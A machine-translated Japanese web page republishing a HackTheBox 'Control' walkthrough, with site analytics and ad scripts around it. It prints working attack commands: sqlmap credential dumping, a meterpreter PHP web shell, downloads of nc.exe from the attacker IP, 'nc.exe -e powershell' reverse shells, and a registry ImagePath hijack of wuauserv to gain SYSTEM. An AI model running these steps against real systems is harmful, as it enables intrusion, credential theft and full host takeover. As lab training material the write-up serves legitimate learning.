<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👻 📿 ↪️ ボックスをハックします。通過制御。サービス権限によるSQLインジェクションとLPE 👨🏾‍🏭 🤤 👆🏻</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="HackTheBox サイトからさらに処理するために送信されたソリューションを引き続き公開しています。
 
 この記事では、SQLインジェクションを介してシステムに侵入し、コマンドラインの履歴を詳しく調べて、サービスへの権限のおかげで特権を増やします。
 
 実験室への接続はVPN経由です。情報セキ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>ボックスをハックします。通過制御。サービス権限によるSQLインジェクションとLPE</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/499060/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/y_/ag/j1/y_agj1md5zinn0p_o8ucn6nrcfq.png" alt="画像"></div><br><font style="vertical-align: inherit;"></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HackTheBox</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
サイトから</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">さらに処理</font></a><font style="vertical-align: inherit;">するために送信されたソリューションを引き続き公開して</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">い</font></a><font style="vertical-align: inherit;">ます</font><font style="vertical-align: inherit;">。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この記事では、SQLインジェクションを介してシステムに侵入し、コマンドラインの履歴を詳しく調べて、サービスへの権限のおかげで特権を増やします。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
実験室への接続はVPN経由です。</font><font style="vertical-align: inherit;">情報セキュリティの分野で何かを知っている人とプライベートネットワークに行き着くため、仕事用のコンピュータや、重要なデータが利用できるホストから接続しないことをお勧めします。</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">組織情報</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">偵察</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このマシンのIPアドレスは10.10.10.167で、/ etc / hostsに追加しています。</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.167    control.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
まず、開いているポートをスキャンします。</font><font style="vertical-align: inherit;">nmapですべてのポートをスキャンするには時間がかかるため、最初にmasscanでこれを実行します。</font><font style="vertical-align: inherit;">tun0インターフェースからすべてのTCPおよびUDPポートを毎秒1000パケットの速度でスキャンします。</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.167   --rate=1000</code></pre><br>
<img src="https://habrastorage.org/webt/zg/fy/fu/zgfyfurcecpe-cka_lnykhsrcne.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ここで、ポートで動作するサービスの詳細については、-Aオプションを指定してスキャンを実行します。</font></font><br>
<pre><code class="bash hljs">nmap -A control.htb -p80,135,3306,49667,49666</code></pre><br>
<img src="https://habrastorage.org/webt/eo/ql/7a/eoql7aimt9_z47br5j4v_vmfzai.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ホストはWebサーバーを実行しています。何があるか見てみましょう。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/jg/gj/eg/jggjeg_agns8gedjluaymnrgmuc.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして、管理パネルへのリンクがあることがわかります。ただし、ヘッダーがないため、プロキシ経由で接続する必要があることが通知されます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ty/qu/zn/tyquznnocwmjntlmqzrfa2exkeq.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
同時に、スタートページのソースコードに次のメッセージが表示されます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ww/rb/ht/wwrbhtb-ecfdehebmwvxaorailq.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
プロキシを使用するために必要なものと検出されたアドレスを比較すると、そこを通過する必要があると想定しています。プロキシは、HTTPプロトコルのx-forwarded-forヘッダーに表示されます。それを公開しましょう。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/xt/7v/gz/xt7vgzpnuhaxx7wwxt_t1a8mjgm.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして正常に管理ページに移動します。ブラウザを見てみましょう。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/k6/9v/jt/k69vjt9fkb-slnguropll7g4yws.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
しかし、あなたが何かをしようとすると、彼らは私たちにプロキシメッセージのあるページを表示します。これは、見つかったヘッダーを置換しないためです。 Burp Suiteで毎回これを行わないようにするために、[Proxy]-&gt; [Options]タブに「Match and Replace」機能があります。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ee/bp/jx/eebpjxadru01wuroipptxqtqx-q.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして、このヘッダーをすべての発信要求に自動的に追加する新しいエントリを追加します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ts/qi/xp/tsqixpvs8glppx4sw6zrt9byo_k.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして、SQLインジェクションを見つける検索フィールドをテストします。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/rl/0n/bn/rl0nbntyfysfaidg_kmx6jrqpk0.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
操作にはsqlmapを使用します。</font><font style="vertical-align: inherit;">このリクエストをファイルに保存し（ファイルにコピー）、sqlmapを実行し、このファイルをパラメーターとして渡します。</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req</code></pre><br>
<img src="https://habrastorage.org/webt/c9/ir/pl/c9irplxxa0exy0byxlfofpmtvk8.png" alt="画像"><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">エントリポイント</font></font></b><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
利用可能なデータベースを見てみましょう。</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req --dbs</code></pre><br>
<img src="https://habrastorage.org/webt/s_/2z/t_/s_2zt_w40pnldgxyt-cmxmzkvfw.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
使用できる資格情報を調べてみましょう。</font><font style="vertical-align: inherit;">mysqlデータベース内のすべてのテーブルを見てみましょう。</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req -D mysql --tables</code></pre><br>
<img src="https://habrastorage.org/webt/ke/-v/je/ke-vje10bm0a0wxqsvtbkloeetu.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そこで、userテーブルに注目します。</font><font style="vertical-align: inherit;">すべての列の名前を取得しましょう。</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req -D mysql -T user --columns</code></pre><br>
<img src="https://habrastorage.org/webt/19/gw/or/19gworxp_r4qy1kxbey7yvbtuko.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
すべての列の中で最も興味深いのは、ユーザーとパスワードです。</font><font style="vertical-align: inherit;">私たちはそれらの中に何があるかを学びます。</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req -D mysql -T user -C User,Password --dump</code></pre><br>
<img src="https://habrastorage.org/webt/e-/76/b4/e-76b4pv25daqhkvxf-zwhqha1g.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
データベースには複数のユーザーが含まれています。</font><font style="vertical-align: inherit;">Sqlmapはハッシュをクラックすることを提案します。</font><font style="vertical-align: inherit;">辞書攻撃を選択し、辞書を使用することを示し、rockyouへのパスを記述します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/og/fp/us/ogfpusgoxax5y4oby4r4isautx8.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
数秒後、ユーザー名とパスワードのハッシュを含むテーブルが提供されます。</font><font style="vertical-align: inherit;">sqlmapがパスワードをクラックできた場合は、ハッシュの横に括弧で囲まれて示されます。</font><font style="vertical-align: inherit;">ご覧のとおり、ユーザーhectorの資格情報があります。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/3l/wh/pp/3lwhppkhebq6-zciqhxufbergyg.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
sqlmapを使用してシェルを取得できませんでしたが、ファイルを書き出しています。</font><font style="vertical-align: inherit;">歩いたウェブを投稿しましょう。</font><font style="vertical-align: inherit;">最初に、メーター形式のロードをPHP形式で生成します。</font></font><br>
<pre><code class="bash hljs">msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.15.82 LPORT=4321 -f raw &gt; r.php<font></font>
cat r.php | xclip -selection clipboard &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">'&lt;?php '</span> | tr -d <span class="hljs-string">'\n'</span> &gt; r.php &amp;&amp; xclip -selection clipboard -o &gt;&gt; r.php</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、sqlmapを使用してWebサーバーディレクトリに書き込みます。</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req --file-write=/home/ralf/tmp/r.php --file-dest=C:/inetpub/wwwroot/r.php</code></pre><br>
<img src="https://habrastorage.org/webt/f-/ov/hr/f-ovhrbjd12vmuczfbltop8nzya.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ファイルは正常に書き込まれました。</font><font style="vertical-align: inherit;">リスナーを実行します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/n_/8-/ql/n_8-qly45zo-_ihgxv9v54g5fwu.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして、Webサーバー上のファイルに移動します。</font></font><br>
<pre><code class="bash hljs">curl http://control.htb/r.php</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Metasploitウィンドウで、接続の成功を確認します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/qy/bp/yy/qybpyydcw15sv7zk5borirt75jc.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このセッションに移動します。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ah/fu/3f/ahfu3f12oacub1nb_pbc4nu0flg.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
しかし、ここに問題があります。シェルを介してコマンドを実行することができず、そのような試みは接続をリセットします。</font><font style="vertical-align: inherit;">コマンドをパラメーターとして渡し（-a）、ビューから非表示（-H）にインタラクティブモード（-i）でPowerShellプロセスを作成して、ロックをバイパスしてみましょう。</font><font style="vertical-align: inherit;">どのユーザーの下で作業しているかを調べてみましょう。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/tg/c1/ph/tgc1photow2juvshqy_imh2wop0.png" alt="画像"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ユーザー</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
私たちはヘクターの資格情報を持っています。システムにそのようなユーザーがいるかどうかを調べます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/4r/tw/9h/4rtw9hec22vofi3vvcjfn2bgqza.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そんなユーザーがいます！</font><font style="vertical-align: inherit;">しかし、最初に、車の名前を調べます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/_0/q1/yd/_0q1ydmzwb0jg10dxhfcd5gdszm.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ユーザー名、パスワード、ドメイン、マシン名があります。</font><font style="vertical-align: inherit;">次に、受け取った資格情報が適切かどうかを確認します。</font><font style="vertical-align: inherit;">これを行うには、Hectorに代わって「whoami」を実行します。</font></font><br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"<span class="hljs-variable">$username</span> = 'Control\Hector' ; <span class="hljs-variable">$password</span> = 'l33th4x0rhector' ; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force ; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span> ; Invoke-command -computername Fidelity -credential <span class="hljs-variable">$credential</span> -scriptblock { whoami }"</span> -i -H</code></pre><br>
<img src="https://habrastorage.org/webt/f7/zv/gz/f7zvgzzrv5rymzoknsodblm8qqw.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
いいよ </font><font style="vertical-align: inherit;">シェルを取得しましょう。</font><font style="vertical-align: inherit;">ローカルホストでWebサーバーを実行します。</font></font><br>
<pre><code class="bash hljs">python3 -m http.server 80</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして、リモートのNetcatホストにアップロードします。</font></font><br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"<span class="hljs-variable">$username</span> = 'Control\Hector' ; <span class="hljs-variable">$password</span> = 'l33th4x0rhector' ; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force ; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span> ; Invoke-command -computername Fidelity -credential <span class="hljs-variable">$credential</span> -scriptblock { iwr 10.10.15.82/nc.exe -o C:\\Users\\Hector\\Documents\\nc.exe }"</span> -i -H</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
5432ポートを開きます。</font><font style="vertical-align: inherit;">nc -lvp 5432とリモートホストからの逆接続を行います。</font></font><br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"<span class="hljs-variable">$username</span> = 'Control\Hector' ; <span class="hljs-variable">$password</span> = 'l33th4x0rhector' ; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force ; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span> ; Invoke-command -computername Fidelity -credential <span class="hljs-variable">$credential</span> -scriptblock { C:\\Users\\Hector\\Documents\\nc.exe -e powershell 10.10.15.82 5432 }"</span> -i -H</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
それで、ユーザーを取ります。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/z6/wu/-v/z6wu-vdgfchbqaobjsq83pdpdpe.png" alt="画像"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ルート</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、ホストからホストに情報を収集する手段（</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BloodHound</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerUp</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JAWS</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WinPEASなど</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）の</font><font style="vertical-align: inherit;">1つをアップロードしようとする</font><font style="vertical-align: inherit;">と、防御側がそれらを削除していることが</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">わかり</font></a><font style="vertical-align: inherit;">ます。</font><font style="vertical-align: inherit;">ただし、WinPEASには</font><font style="vertical-align: inherit;">アンインストールできない</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">batバージョン</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">があります。</font><font style="vertical-align: inherit;">ホストにアップロードして実行します。</font><font style="vertical-align: inherit;">さらに、収集した情報を注意深く検討するだけで済みます。</font><font style="vertical-align: inherit;">そして、興味深いファイルConsoleHost_history.txtを見つけ</font></font><br>
<br>
<img src="https://habrastorage.org/webt/k3/oe/z4/k3oez4vknoc6njwzz0tvs_wav8i.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ます。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wy/pr/av/wypravr1cr2pa2im8on8yl34rew.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
私たちが持っているのはこれらのチームだけです。</font><font style="vertical-align: inherit;">Get-Aclコマンドレットは、ファイルまたはリソースのセキュリティ記述子を表すオブジェクトを取得します。</font><font style="vertical-align: inherit;">セキュリティ記述子には、リソースアクセス制御リスト（ACL）が含まれています。</font><font style="vertical-align: inherit;">ACLには、ユーザーおよびユーザーグループがリソースにアクセスするために必要な権限が含まれています。</font><font style="vertical-align: inherit;">したがって、ソリューションパスはサービスとそれらへのアクセスにあると判断しました。</font><font style="vertical-align: inherit;">Hectorのすべてのサービスと権限を取得します。</font></font><br>
<br>
<pre><code class="bash hljs">get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i <span class="hljs-string">"Hector Users Path"</span></code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
出力を見ると、HectorがWindows更新サービス-wuauservに対する完全な権利を持っていることがわかります。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/sp/je/pk/spjepkdg3e1zsisqo8vhvz_1gmk.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Windowsオペレーティングシステムのサービスは、システム権限で実行されます。</font><font style="vertical-align: inherit;">システムにサービスを登録するとき、サービス実行可能ファイルへのパスはImagePath属性で保護されます。</font><font style="vertical-align: inherit;">この属性の値を変更して、シェルをロードしてみましょう。</font></font><br>
<pre><code class="bash hljs">reg add <span class="hljs-string">"HKLM\System\CurrentControlSet\Services\wuauserv"</span> /v ImagePath /t REG_SZ /d <span class="hljs-string">"C:\Users\Hector\Documents\nc.exe -e powershell 10.10.15.82 6543"</span></code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、更新サービスを開始します。</font></font><br>
<pre><code class="bash hljs">start-service wuauserv</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そして、最大の特権を持つシェルを取得します。</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">Telegramで</font></a></font><br>
<br>
<img src="https://habrastorage.org/webt/im/w1/tq/imw1tqnkohjh-qs-nvwbuggywoy.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
参加でき</font><font style="vertical-align: inherit;">ます。</font><font style="vertical-align: inherit;">興味深い資料、統合されたコース、ソフトウェアを見つけることができます。</font><font style="vertical-align: inherit;">ITの多くの分野に精通している人々が集まるコミュニティをまとめましょう。そうすれば、ITと情報セキュリティの問題について常に互いに助け合うことができます。</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja499048/index.html">ソルレバンテ：Netflix向けに4KとHDRでアニメを制作した方法</a></li>
<li><a href="../ja499052/index.html">外部データストレージ：IBM 1311の時から現在まで。パート2</a></li>
<li><a href="../ja499054/index.html">新しい場所のリーダー：生存指導</a></li>
<li><a href="../ja499056/index.html">Amazonの構成</a></li>
<li><a href="../ja499058/index.html">誰がディープオーディオに携わっており、なぜそれが必要なのか</a></li>
<li><a href="../ja499062/index.html">物理的な問題はほとんどありません</a></li>
<li><a href="../ja499064/index.html">統計的言語モデルを使用した代替の文脈理解</a></li>
<li><a href="../ja499068/index.html">点群変換パラメーターの定義</a></li>
<li><a href="../ja499070/index.html">ПШЕAndroidStudioまたはVCSツールを最大限に使用する方法</a></li>
<li><a href="../ja499074/index.html">symfony 5バンドルでコードを再利用する方法は？パート4.ホストバンドル拡張</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>